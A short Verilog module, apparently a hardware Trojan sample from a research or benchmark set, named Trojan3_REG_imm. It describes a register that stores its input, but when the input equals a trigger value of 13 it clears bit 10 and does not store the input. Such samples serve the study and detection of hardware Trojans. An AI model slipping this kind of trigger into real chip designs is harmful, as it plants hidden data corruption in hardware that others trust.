`timescale 1ns/1ns


module Trojan3_REG_imm #(n = 32, prime_num = 13, rd = 10)
			(input clk,
			input [n-1:0] din,
			output reg [n-1:0] REG_cell);
			
	//reg [n-1:0] REG_cell; 		
			
	always @ (posedge clk) begin 
		if (din == prime_num)
			REG_cell[rd] <= 0;	
		else
			REG_cell <= din;
	end	
	
endmodule